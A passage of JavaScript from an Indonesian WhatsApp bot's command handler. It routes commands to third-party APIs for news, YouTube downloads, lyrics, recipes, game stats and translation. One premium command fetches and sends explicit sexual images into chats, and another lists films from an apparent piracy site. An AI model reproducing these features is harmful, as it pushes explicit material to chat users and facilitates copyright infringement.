			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
		    if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
			   channel = args[0]
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
			   for (var x in get_result) {
				   ini_txt += `${x} - ${get_result[x]}\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender)
			   break  
	  case 'jadwaltvnow':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		   get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/now?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = `Jadwal TV Now :\n`
			   for (var x in get_result) {
				   ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break 
		  case 'newsinfo':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/newsinfo?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = "Result :\n"
			   for (var x of get_result) {
				   ini_txt += `Title : ${x.title}\n`
				   ini_txt += `Author : ${x.author}\n`
				   ini_txt += `Source : ${x.source.name}\n`
				   ini_txt += `Url : ${x.url}\n`
				   ini_txt += `Published : ${x.publishedAt}\n`
				   ini_txt += `Description : ${x.description}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		   case 'cnnindonesia':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = "Result :\n"
			   for (var x of get_result) {
				   ini_txt += `Judul : ${x.judul}\n`
				   ini_txt += `Link : ${x.link}\n`
				   ini_txt += `Tipe : ${x.tipe}\n`
				   ini_txt += `Published : ${x.waktu}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		   case 'cnnnasional':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = "Result :\n"
			   for (var x of get_result) {
				   ini_txt += `Judul : ${x.judul}\n`
				   ini_txt += `Link : ${x.link}\n`
				   ini_txt += `Tipe : ${x.tipe}\n`
				   ini_txt += `Published : ${x.waktu}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		   case 'cnninternasional':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = "Result :\n"
			   for (var x of get_result) {
				   ini_txt += `Judul : ${x.judul}\n`
				   ini_txt += `Link : ${x.link}\n`
				   ini_txt += `Tipe : ${x.tipe}\n`
				   ini_txt += `Published : ${x.waktu}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break 
			 case 'blowjob':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				reply('Otw gan... *DOSA TANGGUNG SENDIRI*')
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)					
                    client.sendMessage(from, buffer, image)
					await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=${LolApi}`).then((gambar) => {
					client.sendMessage(from, gambar, image, { quoted: mek, caption: `*BONUS GAN !*` })
					})
					break
			   case 'ytmp3premium3':
			   case 'ytmp3premi3':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
					   if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
					   try{
						reply(mess.wait)
			   anu = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio2?apikey=${LolApi}&url=${args[0]}`)
			   yty = `*Data Berhasil Didapatkan!*\n\n*Title :* ${anu.result.title}\n*Ext :* MP3\n*Size :* ${anu.result.size}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
			   buffert = await getBuffer(anu.result.thumbnail)
			   buffer = await getBuffer(anu.result.link)
			   client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
			   client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek, caption: 'Nih om'})
			   await limitAdd(sender) 
				   } catch (e) {
				   console.log(`Error :`, color(e,'red'))
				   reply(mess.error.bug)
			   }
					   break
					   case 'ytmp3premium':
						case 'ytmp3premi':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
			if (args.length === 0) return reply(`Kirim perintah ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title :* ${title}\n*Ext :* MP3\n*Filesize :* ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captions = `*Data Berhasil Didapatkan!*\n\n*Title :* ${title}\n*Ext :* MP3\n*Size :* ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.bug))
				})
				})
				} catch (err) {
				reply(mess.error.bug)
				}
				break
		case 'ytmp4premium':
		case 'ytmp4premi':
			    if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
			    if (args.length === 0) return reply(`Kirim perintah ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			    let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			    if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title :* ${title}\n*Ext :* MP3\n*Filesize :* ${filesizeF}\n*Link :* ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title :* ${title}\n*Ext :* MP4\n*Size :* ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.bug))
				})		
				})
				} catch (err) {
			    reply(mess.error.bug)
				}
				break
					   case 'ytmp4premium3':
					   case 'ytmp4premi3':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
							   if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
							   try{
						reply(mess.wait)
					   anu = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo2?apikey=${LolApi}&url=${args[0]}`)
					   yty = `*Data Berhasil Didapatkan!*\n\n*Title :* ${anu.result.title}\n*Ext :* MP4\n*Size :* ${anu.result.size}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
					   buffert = await getBuffer(anu.result.thumbnail)
					   buffer = await getBuffer(anu.result.link)
					   client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
					   client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
					   await limitAdd(sender) 
						   } catch (e) {
						   console.log(`Error :`, color(e,'red'))
						   reply(mess.error.bug)
					   }
							   break
						case 'ytmp3premium2':
						case 'ytmp3premi2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
					   if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/telDVAKzXU4`)
					   try{
						reply(mess.wait)
			   anu = await fetchJson(`https://api.vhtear.com/ytdl?link=${args[0]}&apikey=${VthearApi}`)
			   yty = `*Data Berhasil Didapatkan!*\n\n*Title :* ${anu.result.title}\n*Ext :* MP3\n*Size :* ${anu.result.size}\n*ID :* ${anu.result.id}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
			   buffert = await getBuffer(anu.result.imgUrl)
			   buffer = await getBuffer(anu.result.UrlMp3)
			   client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
			   client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek, caption: 'Nih om'})
			   await limitAdd(sender) 
				   } catch (e) {
				   console.log(`Error :`, color(e,'red'))
				   reply(mess.error.bug)
			   }
					   break
	case 'ytmp4premium2':
	case 'ytmp4premi2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/telDVAKzXU4`)
				try{
				reply(mess.wait)
				anu = await fetchJson(`https://api.vhtear.com/ytdl?link=${args[0]}&apikey=${VthearApi}`)
				yty = `*Data Berhasil Didapatkan!*\n\n*Title :* ${anu.result.title}\n*Ext :* MP4\n*Size :* ${anu.result.size}\n*ID :* ${anu.result.id}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				buffert = await getBuffer(anu.result.imgUrl)
				buffer = await getBuffer(anu.result.UrlVideo)
				client.sendMessage(from, buffert, image, {quoted: mek, caption: yty})
				client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
				await limitAdd(sender) 
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
				break
    case 'ytshort2':
	          	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	         	if (isLimit(sender)) return reply(mess.limituser)
	        	if (!isPremium) return reply(mess.only.premium)
	        	if (args.length === 0) return reply(`Kirim perintah ${prefix}ytshort https://youtube.com/shorts/lBQb1rvY9ao`)
	        	let isLinks3 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/shorts\?feature=|\/)([^\s&]+)/)
	         	if (!isLinks3) return reply(mess.error.Iv)
	        	try {
	        	reply(mess.wait)
				ytshort(args[0])
	         	.then((res) => {
	         	const { dl_link, thumb, title, filesizeF, filesize } = res
	         	axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
	        	.then((a) => {
	        	if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title :* ${title}\n*Ext :* MP3\n*Filesize :* ${filesizeF}\n*Link :* ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
	         	const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title :* ${title}\n*Ext :* MP4\n*Size :* ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
	        	sendMediaURL(from, thumb, captionsYtmp4)
	         	sendMediaURL(from, dl_link).catch(() => reply(mess.error.bug))
	        	})		
	         	}) 
	        	} catch (err) {
	        	reply(mess.error.bug)
	         	}
	          	break
	case 'ytshort':
			    if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
			    if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/shorts/lBQb1rvY9ao`)
				try{
				reply(mess.wait)
				anu = await fetchJson(`https://api.vhtear.com/youtube_short_download?link=${args[0]}&apikey=${VthearApi}`)
				buffer = await getBuffer(anu.result.url_video)
				client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
				await limitAdd(sender) 
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
				break
	case 'lirik':
		        if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
				if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
				try{
				query = args.join(" ")
				get_result = await fetchJson(`http://api.lolhuman.xyz/api/lirik?apikey=${LolApi}&query=${query}`)
				reply(get_result.result)
				await limitAdd(sender) 
				} catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
				break
   case 'liriklagu':
	            if (!isPremium) return reply(mess.only.premium)
	            if (!isRegistered) return reply(mess.only.userB)
	            if (isBanned) return reply(mess.only.benned)
	            if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
				try{
			    query = args.join(" ")
			    get_result = await fetchJson(`https://api.vhtear.com/liriklagu?query=${query}&apikey=${VthearApi}`)
			    reply(get_result.result.result)
				await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
			    break
	   case 'chord2':
	        	if (!isRegistered) return reply(mess.only.userB)
	        	if (isBanned) return reply(mess.only.benned)
	        	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length < 1) return reply('Mau Nyari Chord Lagu Apa??')
			    tels = body.slice(7)
			    anu = await fetchJson(`https://alfians-api.herokuapp.com/api/chord?q=${tels}`, {method: 'get'})
			    client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
			    await limitAdd(sender) 
			    break 
		   case 'chord':
		    	if (!isRegistered) return reply(mess.only.userB)
		    	if (isBanned) return reply(mess.only.benned)
		     	if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis senja`)
				try{
			    query =  body.slice(7)
			    anu = await fetchJson(`http://api.lolhuman.xyz/api/chord?apikey=${LolApi}&query=${query}`)
			    ini_txt = `*Title :* ${anu.result.title}\n`
			    ini_txt += `*Created :* ${anu.result.created}\n`
			    ini_txt += `*Modified Username :* ${anu.result.modified.username}\n`
			    ini_txt += `*Modified First Name :* ${anu.result.modified.first_name}\n`
			    ini_txt += `*Modified Last Name :* ${anu.result.modified.last_name}\n`
			    ini_txt += `*Chord :*\n${anu.result.chord}`
			    reply(ini_txt)
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
			    break
	case 'chordlagu':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			if (!isPremium) return reply(mess.only.premium)
			   if (args.length == 0) return reply(`Example: ${prefix + command} Melukis senja`)
			   try{
			   query = args.join(" ")
			   anu = await fetchJson(`https://api.vhtear.com/chordguitar?query=${query}&apikey=${VthearApi}`)
			   ini_txt = `*Title :* ${query}\n`
			   ini_txt += `*Chord :* \n${anu.result.result}`
			   reply(ini_txt)
			   } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
				}
			   break
		case 'resep':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				  anu = await fetchJson(`https://api.vhtear.com/resepmasakan?query=${body.slice(6)}&apikey=${VthearApi}`)
				  masak = `• *Title:* ${anu.result.title}\n• *Desc:* ${anu.result.desc}\n• *Bahan:* ${anu.result.bahan}\n• *Cara:* ${anu.result.cara}`
				  buffert = await getBuffer(anu.result.image)
				  client.sendMessage(from, buffert, image, {quoted: mek, caption: masak})
				  await limitAdd(sender) 
				  break 
		  case 'resep2':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			  anu = await fetchJson(`https://masak-apa.tomorisakura.vercel.app/api/search?q=${body.slice(7)}`, {method: 'get'})
			  masak = '==============================\n'
			  for (let msk of anu.results){
			  masak += `• *Title:* ${msk.title}\n• *• *Durasi Masak Sekitar:* ${msk.times}\n• *Porsi:* ${msk.serving}\n• *Tingkat Kesulitan:* ${msk.difficulty}\n• *Link:* https://www.masakapahariini.com/?s=${msk.key}\n==============================\n`
			  }
			  reply(masak.trim())
			  await limitAdd(sender) 
			  break 
		  case 'brainly':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			try{
				brainly(`${q}`).then(res => {
					teks = '❉───────────❉\n'
					for (let Y of res.data) {
						teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉───────────❉\n`
					}
					reply(`Success: ${res.success}\nLength: ${res.length}\nMessage: ${res.message}`)
					client.sendMessage(from, teks, text, {quoted: mek, detectLinks: false})				
                        console.log(res)
                    }) /*
					try{
					brain = await fetchJson(`https://api.vhtear.com/branly?query=${body.slice(9)}&apikey=${VthearApi}`)
					reply(`${brain.result.data}`) */
					await limitAdd(sender) 
				    } catch (e) {
					console.log(`Error :`, color(e,'red'))
					reply(mess.error.bug)
					}
		   break 
   case 'brainly2':
			   if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/brainly2?apikey=${LolApi}&query=${args.join(" ")}`)
			   lala = get_result.result
			   ini_txt = "Beberapa Pembahasan Dari Brainly :\n\n"
			   for (var x of lala) {
				   ini_txt += `==============================\n`
				   ini_txt += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				   ini_txt += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				   ini_txt += `==============================\n\n`
			   }
			   reply(ini_txt)
			   break
	  case 'gsm':
	  case 'gsmarena':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
				if (args.length < 1) return reply('Nama Hpnya mana kak?')
				 hmml = await fetchJson(`http://api.lolhuman.xyz/api/gsmarena?apikey=${LolApi}&query=${body.slice(5)}`)		
				buffer = await getBuffer(hmml.result.phone_image)
				hmmi = hmml.result.specification
				hasilbg = `*Nama Hp* : *_${hmml.result.phone_name}_*\n*Memori* : *_${hmmi.memory.internalmemory}_*\n*Battery* : *_${hmmi.battery.batdescription1}_*`
			client.sendMessage(from, buffer, image, {quoted: mek, caption: hasilbg})
				await limitAdd(sender)
				break
		 case 'playstore':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)	
	    	if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
			   query = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/playstore?apikey=${LolApi}&query=${query}`)
			   get_result = get_result.result
			   ini_txt = 'Play Store Search : \n'
			   for (var x of get_result) {
				   ini_txt += `Name : ${x.title}\n`
				   ini_txt += `ID : ${x.appId}\n`
				   ini_txt += `Developer : ${x.developer}\n`
				   ini_txt += `Link : ${x.url}\n`
				   ini_txt += `Price : ${x.priceText}\n`
				   ini_txt += `Price : ${x.price}\n\n`
			   }
			   reply(ini_txt)
			 break
		 case 'shopee':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
			   query = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/shopee?apikey=${LolApi}&query=${query}`)
			   get_result = get_result.result
			   ini_txt = 'Shopee Search : \n'
			   for (var x of get_result) {
				   ini_txt += `Name : ${x.name}\n`
				   ini_txt += `Terjual : ${x.sold}\n`
				   ini_txt += `Stock : ${x.stock}\n`
				   ini_txt += `Lokasi : ${x.shop_loc}\n`
				   ini_txt += `Link : ${x.link_produk}\n\n`
			   }
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break
		  case 'trendtwit':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   data = await fetchJson(`https://docs-jojo.herokuapp.com/api/trendingtwitter`, {method: 'get'})
			   teks = '=================\n'
			   for (let i of data.result) {
				   teks += `*Hastag* : ${i.hastag}\n*link* : ${i.link}\n*rank* : ${i.rank}\n*Tweet* : ${i.tweet}\n=================\n`
			   }
			   reply(teks.trim())
			   await limitAdd(sender) 
			   break 
	   case 'google':
		   const googleQuery = body.slice(8)
		   if (!isRegistered) return reply(mess.only.userB)
		   if (isBanned) return reply(mess.only.benned)
		   if (isLimit(sender)) return reply(mess.limituser)
		  // if (!isPremium) return reply(mess.only.premium)
		   if(googleQuery == undefined || googleQuery == ' ') return reply(`*Hasil Pencarian : ${googleQuery}* tidak ditemukan`)
		   google({ 'query': googleQuery }).then(results => {
		   let vars = `*Hasil Pencarian :* ${googleQuery}\n\n`
		   for (let i = 0; i < results.length; i++) {
			   vars +=  `═════════════════\n*Judul :* ${results[i].title}\n*Deskripsi :* ${results[i].snippet}\n*Link :* ${results[i].link}\n`
		   }
			   reply(vars)
		   }).catch(e => {
			   console.log(e)
			   client.sendMessage(from, 'Google Error : ' + e);
		   })
		   await limitAdd(sender) 
		   break 
	   case 'kbbi':
			   if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/kbbi?apikey=${LolApi}&query=${args.join(" ")}`)
			   lila = get_result.result
			   ini_txt = `*Kata :* ${lila[0].nama}\n`
			   ini_txt += `*Kata Dasar :* ${lila[0].kata_dasar}\n`
			   ini_txt += `*Pelafalan :* ${lila[0].pelafalan}\n`
			   ini_txt += `*Bentuk Tidak Baku :* ${lila[0].bentuk_tidak_baku}\n\n`
			   for (var x of lila) {
				   ini_txt += `*Kode :* ${x.makna[0].kelas[0].kode}\n`
				   ini_txt += `*Kelas :* ${x.makna[0].kelas[0].nama}\n`
				   ini_txt += `*Artinya :* ${x.makna[0].kelas[0].deskripsi}\n\n`
				   ini_txt += `*Makna Lain :* ${x.makna[0].submakna}\n`
				   ini_txt += `*Contoh Kalimat :* ${x.makna[0].contoh}\n`
			   }
			   reply(ini_txt)
			   break 
	   case 'wiki':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
			   query = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/wiki?apikey=${LolApi}&query=${query}`)
			   get_result = get_result.result
			   reply(get_result)
			   await limitAdd(sender) 
			   break  
		case 'heroml':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} Fanny`)
			   hero = args[0]
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/heroml/${hero}?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = `Name : ${get_result.hero_name}\n`
			   ini_txt += `Entrance Quotes : ${get_result.ent_quotes}\n`
			   ini_txt += `Role : ${get_result.detail.role}\n`
			   ini_txt += `Specialty : ${get_result.detail.specialty}\n`
			   ini_txt += `Laning : ${get_result.detail.laning_recommendation}\n`
			   ini_txt += `Release : ${get_result.detail.release_date}\n`
			   ini_txt += `Movement speed : ${get_result.attr.movement_speed}\n`
			   ini_txt += `Physical attack : ${get_result.attr.physical_attack}\n`
			   ini_txt += `Magic power : ${get_result.attr.magic_power}\n`
			   ini_txt += `Physical defense : ${get_result.attr.physical_defense}\n`
			   ini_txt += `Magic defense : ${get_result.attr.magic_defense}\n`
			   ini_txt += `Critical rate : ${get_result.attr.basic_atk_crit_rate}\n`
			   ini_txt += `Hp : ${get_result.attr.hp}\n`
			   ini_txt += `Mana : ${get_result.attr.mana}\n`
			   ini_txt += `Mana regen : ${get_result.attr.mana_regen}\n`
			   ini_icon = await getBuffer(get_result.icon)
			   client.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
			   await limitAdd(sender) 
			   break
		case 'mlstalk':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
			   ml_id = args[0]
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=${LolApi}`)
			   reply(get_result.result)
			   await limitAdd(sender) 
			   break
		case 'ffstalk':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
					   if (args.length == 0) return reply(`Example: ${prefix + command} 570098876`)
				   ff_id = args[0]
				   get_result = await fetchJson(`http://api.lolhuman.xyz/api/freefire/${ff_id}?apikey=${LolApi}`)
				   reply(get_result.result)
				   await limitAdd(sender) 
				   break
		 case 'ceknamaml': // By anker
		 if (!isRegistered) return reply(mess.only.userB)
		 if (isBanned) return reply(mess.only.benned)
		 if (isLimit(sender)) return reply(mess.limituser)
	//	 if (!isPremium) return reply(mess.only.premium)
			   gatauda = body.slice(11)
			   anu = await fetchJson(`http://api.lolhuman.xyz/api/mobilelegend/${gatauda}?apikey=${LolApi}`)
			   reply(anu.result)
			   await limitAdd(sender)
			   break
		case 'genshin':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
			   hero = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/genshin/${hero}?apikey=${LolApi}`)
			   get_result = get_result.result
			   ini_txt = `Name : ${get_result.title}\n`
			   ini_txt += `Intro : ${get_result.intro}\n`
			   ini_txt += `Icon : ${get_result.icon}\n`
			   ini_icon = await getBuffer(get_result.cover1)
			   client.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
			   ini_voice = await getBuffer(get_result.cv[0].audio[0])
			   client.sendMessage(from, ini_voice, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
			   await limitAdd(sender) 
			   break
		case 'translate':
		case 'translete':
		case 'ts':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			   if (args.length == 0) return reply(`Example: ${prefix + command} en Selamat Pagi`)
			   kode_negara = args[0]
			   args.shift()
			   ini_txt = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${LolApi}&text=${ini_txt}`)
			   get_result = get_result.result
			   init_txt = `From : ${get_result.from}\n`
			   init_txt += `To : ${get_result.to}\n`
			   init_txt += `Original : ${get_result.original}\n`
			   init_txt += `Translated : ${get_result.translated}\n`
			   init_txt += `Pronunciation : ${get_result.pronunciation}\n`
			   reply(init_txt)
			  await limitAdd(sender)
			  break 
	case 'filmapikterbaru':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		   film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
		   teks = '=================\n'
		   for (let i of film.result) {
			   teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
			   }
		   reply(teks.trim())
		   await limitAdd(sender)
		   break
	case 'filmapikdrama':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			if (!isPremium) return reply(mess.only.premium)
		   film = await fetchJson(`http://zekais-api.herokuapp.com/filmapiklatest`, {method: 'get'})
		   teks = '=================\n'
		   for (let i of film.result) {
